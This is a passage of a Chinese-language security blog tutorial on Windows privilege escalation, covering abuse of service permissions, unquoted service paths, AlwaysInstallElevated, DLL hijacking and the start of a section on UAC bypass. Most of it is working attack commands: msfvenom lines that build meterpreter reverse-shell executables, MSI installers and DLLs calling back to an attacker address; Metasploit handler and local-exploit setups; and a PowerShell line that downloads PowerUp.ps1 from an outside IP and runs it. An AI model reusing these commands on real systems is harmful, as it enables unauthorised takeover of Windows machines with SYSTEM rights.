+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">108</span><span class="p">.</span><span class="na">31</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="n">6666</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">exe</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">exe</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">msfconsole</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="n">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="n">6666</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exploit</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">使用service_permissions进行提权</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">service_permissions</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exploit</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>service_permissions模块会使用两种方式获取system权限</strong></p>
+<p><strong>1.如果以管理员权限运行会尝试创建并运行一个新的服务</strong></p>
+<p><strong>2.如果当前权限不允许创建服务会判断哪些服务的文件或文件夹的权限有问题并对其进行劫持</strong></p>
+<p><strong>在劫持服务时会创建一个可执行程序其文件名和安装路径都是随机的</strong></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/4.png"
+	width="1844"
+	height="572"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/4_hu_d71dafbb2521ad15.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/4_hu_e1926e461b9af5c9.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="322"
+		data-flex-basis="773px"
+	
+></p>
+<h3 id="122使用windows可信任服务路径提权">1.2.2.使用Windows可信任服务路径提权
+</h3><p>可信任服务路径(Trusted Service Paths)漏洞利用了Windows文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像这样的路径：</p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/5.png"
+	width="1365"
+	height="589"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/5_hu_795aaf9c3ca57545.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/5_hu_40ee89e6c8ba62c3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="231"
+		data-flex-basis="556px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">通过以下这条命令查找系统中可信任服务路径</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">wmic</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">displayname</span><span class="p">,</span><span class="n">pathname</span><span class="p">,</span><span class="n">startmode</span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="s">&#34;Auto&#34;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="s">&#34;C:\Windows\\&#34;</span><span class="w"> </span><span class="o">|</span><span class="n">findstr</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="s">&#34;&#34;&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/6.png"
+	width="1718"
+	height="763"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/6_hu_69a7cd410ff01235.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/6_hu_a269074fb18e65f8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="225"
+		data-flex-basis="540px"
+	
+></p>
+<p><strong>如果存在这种服务，检查对这种服务目录是否存在写入权限，使用windows自带的icacls查看路径受影响文件夹权限</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">icacls</span><span class="w"> </span><span class="s">&#34;C:/Program Files&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/7.png"
+	width="799"
+	height="653"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/7_hu_3c8bab2576842b59.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/7_hu_da664a4cf4528723.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="122"
+		data-flex-basis="293px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">M</span><span class="w"> </span><span class="n">代表修改权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">F</span><span class="w"> </span><span class="n">代表完全控制</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CI</span><span class="w"> </span><span class="n">代表从属容器将继承访问控制项</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">OI</span><span class="w"> </span><span class="n">代表从属文件将继承访问控制项</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="13alwaysinstallelevated提权">1.3.AlwaysInstallElevated提权
+</h2><p><a class="link" href="https://blog.csdn.net/2301_80361487/article/details/139379246"  target="_blank" rel="noopener"
+    >Windows操作系统提权之系统服务漏洞提权Always Install Elevated_alwaysinstallelevated-CSDN博客</a></p>
+<p><strong>介绍：</strong></p>
+<p><strong>注</strong><font style="color:#DF2A3F;">册表AlwaysInstallElevated是一个策略设置项。Windows允许低权限用户以SYSTEM权限运行安装文件。</font></p>
+<p><strong><font style="color:#DF2A3F;">如果启用此策略设置项，那么任何权限的用户都能以SYSTEM权限来安装恶意的MSl(Microsoft Windows Installer）文产生该漏洞的原因是由于用户在策略编辑器中开启了Windows Installer特权安装功能。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">组策略</span><span class="o">---</span><span class="n">计算机配置</span><span class="o">---</span><span class="n">管理模板</span><span class="o">---</span><span class="n">Windows组件</span><span class="o">---</span><span class="n">Windows</span><span class="w"> </span><span class="n">Installer</span><span class="o">---</span><span class="n">永远以高权限进行安装</span><span class="err">：</span><span class="n">选择启用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">组策略</span><span class="o">---</span><span class="n">用户配置</span><span class="o">---</span><span class="n">管理模板</span><span class="o">---</span><span class="n">Windows组件</span><span class="o">---</span><span class="n">Windows</span><span class="w"> </span><span class="n">Installer</span><span class="o">---</span><span class="n">永远以高权限进行安装</span><span class="err">：</span><span class="n">选择启用</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>gpedit.msc 打开组策略管理器，注意：在 Windows 系统中，</strong><code>gpedit.msc</code><strong>（组策略编辑器）默认仅在 Windows 专业版、企业版和教育版 中可用。如果你使用的是 Windows 家庭版，则无法直接打开 <strong><code>gpedit.msc</code></strong>，因为该版本未包含组策略管理器。</strong></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/8.png"
+	width="1434"
+	height="538"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/8_hu_943a2ef113926e63.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/8_hu_10ed7748843d437.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="639px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">使用命令行直接修改</span><span class="o">---</span><span class="n">需要权限</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="n">HKCU</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">AlwaysInstallElevated</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_DWORD</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">reg</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">AlwaysInstallElevated</span><span class="w"> </span><span class="o">/</span><span class="n">t</span><span class="w"> </span><span class="n">REG_DWORD</span><span class="w"> </span><span class="o">/</span><span class="n">d</span><span class="w"> </span><span class="n">1</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>PowerUp:</p>
+<p><a class="link" href="https://github.com/PowerShellMafia/PowerSploit"  target="_blank" rel="noopener"
+    >https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p><strong>可以使用该脚本来检查是否开启</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">ep</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="nf">iex</span><span class="p">(</span><span class="k">new</span><span class="o">-</span><span class="n">object</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">net</span><span class="p">.</span><span class="na">webclient</span><span class="p">).</span><span class="na">downloadstring</span><span class="p">(</span><span class="err">&#39;</span><span class="n">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Get-RegistryAlwaysInstallElevated</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">ep</span><span class="w"> </span><span class="n">bypass</span><span class="w"> </span><span class="nf">iex</span><span class="p">(</span><span class="k">new</span><span class="o">-</span><span class="n">object</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">net</span><span class="p">.</span><span class="na">webclient</span><span class="p">).</span><span class="na">downloadstring</span><span class="p">(</span><span class="err">&#39;</span><span class="n">http</span><span class="p">:</span><span class="c1">//150.158.137.72:8000/PowerUp.ps1&#39;);Get-</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">RegistryAlwaysInstallElevated</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">通过注册表判断</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">reg</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">HKCU</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">Installer</span><span class="w"> </span><span class="o">/</span><span class="n">v</span><span class="w"> </span><span class="n">AlwaysInstallElevated</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">如果没有注册表项的话</span><span class="err">，</span><span class="n">那就代表没有开启</span><span class="err">，</span><span class="n">反之显示0x1则代表开启</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.cnblogs.com/micr067/p/11723492.html"  target="_blank" rel="noopener"
+    >PowerUp攻击模块实战 - micr067 - 博客园</a></p>
+<h3 id="131使用msi-wrapper手动进行提权"><strong>1.3.1.使用MSI Wrapper手动进行提权</strong>
+</h3><p><strong>1.下载exemsi （将exe转换为msi）</strong></p>
+<p><a class="link" href="https://www.exemsi.com/"  target="_blank" rel="noopener"
+    >Convert EXE to MSI - Convert executable installers to MSI packages</a></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/9.png"
+	width="904"
+	height="766"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/9_hu_f136ec5478d13fc6.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/9_hu_279f964bd5b9388e.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="118"
+		data-flex-basis="283px"
+	
+></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/10.png"
+	width="900"
+	height="767"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/10_hu_1dda65d2f39c86e5.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/10_hu_649141490bfc5d1c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="117"
+		data-flex-basis="281px"
+	
+></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/11.png"
+	width="897"
+	height="761"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/11_hu_c7303389720df971.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/11_hu_61cc5fd452bc7de1.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="117"
+		data-flex-basis="282px"
+	
+></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/12.png"
+	width="904"
+	height="766"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/12_hu_a127bc2816786074.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/12_hu_9574e445a312e046.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="118"
+		data-flex-basis="283px"
+	
+></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/13.png"
+	width="904"
+	height="806"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/13_hu_89060d543610e0fb.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/13_hu_5ad70a8c09db20ae.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="112"
+		data-flex-basis="269px"
+	
+></p>
+<p><strong>其它步骤默认即可，一直Next下去</strong></p>
+<p><strong>2.msf生成exe木马文件</strong></p>
+<p><strong>3.使用exemsi将exe封装为msi</strong></p>
+<p><strong>上传这个msi文件到目标主机，运行该文件，即可提权成功</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msiexec</span><span class="w"> </span><span class="o">/</span><span class="n">q</span><span class="w"> </span><span class="o">/</span><span class="n">i</span><span class="w"> </span><span class="n">phpstudy_pro</span><span class="p">.</span><span class="na">msi</span><span class="w">    
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">q</span><span class="w">   </span><span class="n">隐藏界面</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">/</span><span class="n">i</span><span class="w">   </span><span class="n">安装程序</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="132使用msf自带的模块进行提权"><strong>1.3.2.使用MSF自带的模块进行提权</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">always_install_elevated</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="n">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">exploit</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/14.png"
+	width="2224"
+	height="1063"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/14_hu_6a69e9edcdea7033.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/14_hu_7e7188c2b056c2fc.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="209"
+		data-flex-basis="502px"
+	
+></p>
+<h3 id="133直接使用msf生成msi后缀后门">1.3.3.直接使用MSF生成MSI后缀后门
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">exec</span><span class="w"> </span><span class="n">CMD</span><span class="o">=</span><span class="n">cmd</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">msi</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">msi</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="n">6666</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">msi</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">1</span><span class="p">.</span><span class="na">msi</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>只要运行安装该程序，就会跳出一个对话框，权限是System权限</strong></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/15.png"
+	width="707"
+	height="484"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/15_hu_b6d2a536999f4e71.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/15_hu_23b756d5a3638780.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="146"
+		data-flex-basis="350px"
+	
+></p>
+<h2 id="14dll劫持提权">1.4.DLL劫持提权
+</h2><p><strong>原理：</strong></p>
+<p><strong>Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</strong></p>
+<p><strong>攻击过程：收集进程加载的dll-制作dll木马并上传-替换dll启动应用后成功</strong></p>
+<p><strong><font style="color:#DF2A3F;">系统文件的DLL一般是不能修改的，所以一般选择未知文件或数字签名文件</font></strong></p>
+<p><strong><font style="color:#DF2A3F;">那么如何发现这个应用是未知文件或数字签名文件呢，使用火绒剑进行判断</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="n">生成dll木马</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="n">6666</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">dll</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="na">dll</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">将dll木马名称替换为可以劫持使用的dll名称</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="15bypassuac提权">1.5.BypassUAC提权
+</h2><p><a class="link" href="https://www.yuque.com/attachments/yuque/0/2025/pdf/29033686/1745846780100-add72833-fae8-4974-9519-01178e04de78.pdf"  target="_blank" rel="noopener"
+    >BypassUAC提权.pdf</a></p>
+<h3 id="151什么是用户账户控制uac">1.5.1.什么是用户账户控制UAC
+</h3><p>Microsoft的Windows Vista和Windows Server2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p>
+<p>换句话说，<strong>它是Windows的一个安全功能，</strong><font style="color:#DF2A3F;">它支持防止对操作系统进行未经授权的修改</font>，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/16.png"
+	width="1351"
+	height="428"
+	srcset="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/16_hu_756ab187806e4995.png 480w, /p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/16_hu_6474fa98a98e2fdf.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="315"
+		data-flex-basis="757px"
+	
+></p>
+<h3 id="152uac状态">1.5.2.UAC状态
+</h3><p><strong>这里的UAC状态是默认，也就是中等级别，至于打开这个UAC可以在运行框中输入&quot;msconfig&quot;,然后工具一栏就能看到更改UAC设置。一般UAC关闭的情况下使用getsystem就能够提权成功。</strong></p>
+<p><img src="/p/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image/17.png"
+	width="1036"
+	height="938"
